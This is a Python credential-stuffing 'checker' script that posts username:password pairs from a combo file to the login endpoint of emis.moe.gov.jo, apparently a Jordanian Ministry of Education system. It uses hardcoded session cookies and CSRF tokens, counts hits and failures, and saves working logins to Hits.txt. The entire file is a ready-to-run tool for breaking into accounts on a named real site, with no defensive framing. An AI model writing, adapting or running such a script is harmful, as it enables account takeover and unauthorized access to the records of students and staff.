import requests,sys
from colorama import Fore
from os import system
from time import sleep
clear = lambda: system("cls")
clear()
print('\n                CHECKER FOR '+Fore.YELLOW+'https://emis.moe.gov.jo'+Fore.WHITE+' BY '+Fore.MAGENTA+'@A7.ACC            '+Fore.WHITE)
fs = input('\nEnter combo file name \n    >> ')
acc = []
with open('Hits.txt','w',encoding='utf-8') as file:
    pass
fo = open('Hits.txt','a',encoding='utf-8')
# usr = ''
# pwd = ''

# Bad https://emis.moe.gov.jo/openemis-core/
# Bad Forgot password?
# Bad Forgot username?
head = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Length': '531',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'CAKEPHP=n1smuoukf9pcu1sq2bsk332ed7; System=Q2FrZQ%3D%3D.OTY4NThkMmVlNGE0YWM3OGNhMTMyYzkwNGI0NWI2MjdmZWVkZGM0ZTRhN2NhOGQwMjc3YzViMTc4MmZiMDhhMeLbwU580mNossWLUh2Ys48e%2FOssNfVvdANadBQCoquC0srLG1H52qhrt8WO2O6avQ%3D%3D; csrfToken=c988e69d5a4412b592d2c4d6a3ad940dde60ef6ca6ce7f85d921a0eb40896afd267189f986c8d703dab672b2ace0d1698c8d3bebcde048fb8834704997841e5e; SRVNAME=S3|YMTkr|YMTkp',
    'Host': 'emis.moe.gov.jo',
    'Origin': 'https://emis.moe.gov.jo',
    'Referer': 'https://emis.moe.gov.jo/openemis-core/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36'
}
url = 'https://emis.moe.gov.jo/openemis-core/Users/postLogin'

h = 0
b = 0
def check(inf):
    global h,b
    system('title emis.moe.gov.jo CHECKER BY @A7.ACC       HITS:'+str(h)+'   BAD:'+str(b))
    req = requests.session()
    inf = inf.split(':')
    usr = inf[0]
    pwd = inf[1]
    data = {
        '_method': 'POST',
        '_csrfToken': 'c988e69d5a4412b592d2c4d6a3ad940dde60ef6ca6ce7f85d921a0eb40896afd267189f986c8d703dab672b2ace0d1698c8d3bebcde048fb8834704997841e5e',
        'username': usr,
        'password': pwd,
        'System[language]': 'ar',
        'submit': 'login',
        '_Token[fields]': 'e58c4e6df6e1a9623012262178c697f378f0cb0f%3A',
        '_Token[unlocked]': 'submit',
        '_Token[debug]': '%5B%22%5C%2Fopenemis-core%5C%2FUsers%5C%2FpostLogin%22%2C%5B%22username%22%2C%22password%22%2C%22System.language%22%5D%2C%5B%22submit%22%5D%5D'
    }
    r = req.post(url,headers=head,data=data,allow_redirects=True)
    c = str(usr)+':'+str(pwd)
    if 'Forgot password?' not in r.text and 'الصفحة الرئيسية' in r.text and str(r.url) == 'https://emis.moe.gov.jo/openemis-core/Dashboard':
        print('Hit!!! >>>>   '+Fore.GREEN+c+Fore.WHITE)
        fo.write(c+'\n')
        h += 1
    elif str(r.url) == 'https://emis.moe.gov.jo/openemis-core/' and 'Forgot password?' in r.text and 'Forgot username?' in r.text:
        print('Bad    >>>>   '+Fore.RED+c+Fore.WHITE)
        b += 1

    else:
        print(Fore.YELLOW+'Error!')
        fo.close()
        sleep(5)
        print(r.url)
        print()
        print(r.text)
        sleep(5)
        sys.exit()


with open(fs,'r',encoding='utf-8') as f:
    for combo in f.readlines():
        acc.append(combo.strip('\n'))

print('Checking...')
for ac in acc:
    check(ac)
fo.close()
print('\nAll hits saved in Hits.txt file!')
sleep(5)
